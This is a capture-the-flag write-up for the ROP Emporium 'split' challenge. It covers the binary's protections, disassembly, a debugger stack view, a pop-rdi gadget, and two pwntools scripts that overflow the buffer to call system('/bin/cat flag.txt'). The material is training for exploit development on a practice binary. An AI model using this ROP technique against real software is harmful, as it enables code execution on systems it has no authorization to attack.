# split(ROP Emporium 2)

### checksec
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

### Solution
`usefulFunction`: run `system` with `/bin/ls` string.
```asm
0000000000400742 <usefulFunction>:
  400742:	55                   	push   rbp
  400743:	48 89 e5             	mov    rbp,rsp
  400746:	bf 4a 08 40 00       	mov    edi,0x40084a
  40074b:	e8 10 fe ff ff       	call   400560 <system@plt>
  400750:	90                   	nop
  400751:	5d                   	pop    rbp
  400752:	c3                   	ret
  400753:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  40075a:	00 00 00 
  40075d:	0f 1f 00             	nop    DWORD PTR [rax]
```
there is `/bin/cat flag.txt` string at `0x601060`.
```shell
pwndbg> search -t string "/bin/cat flag.txt"
Searching for string: b'/bin/cat flag.txt\x00'
split           0x601060 '/bin/cat flag.txt'
```

after read, stack:
```
00:0000│ rsi rsp 0x7fffffffdc40 ◂— 0xa6161616161 /* 'aaaaa\n' */
01:0008│-018     0x7fffffffdc48 ◂— 0
... ↓            2 skipped
04:0020│ rbp     0x7fffffffdc60 —▸ 0x7fffffffdc70 ◂— 1
05:0028│+008     0x7fffffffdc68 —▸ 0x4006d7 (main+64) ◂— mov edi, 0x400806
06:0030│+010     0x7fffffffdc70 ◂— 1
07:0038│+018     0x7fffffffdc78 —▸ 0x7ffff7dd8d68 (__libc_start_call_main+120) ◂— mov edi, eax
```

ROP gadget
```
0x00000000004007c3 : pop rdi ; ret
```

#### Strategy
1. push `0x601060` to `rdi`
2. call `0x40074b` (`usefulFunction`)

### Script
```python
from pwn import *

conn = process('./split')

payload = b'A'*40
payload += p64(0x4007c3)
payload += p64(0x601060)
payload += p64(0x40074b)

conn.sendafter('> ', payload)
conn.interactive()
```

if use pwntools `ELF` module, it can be more readable.
```python
from pwn import *

elf = ELF('./split')
rop = ROP(elf)

conn = process('./split')

print(type(rop.rdi.address))

payload = b'A'*40
payload += p64(rop.rdi.address)
payload += p64(next(elf.search(b'/bin/cat flag.txt')))
payload += p64(0x40074b)

conn.sendafter('> ', payload)
conn.interactive()
```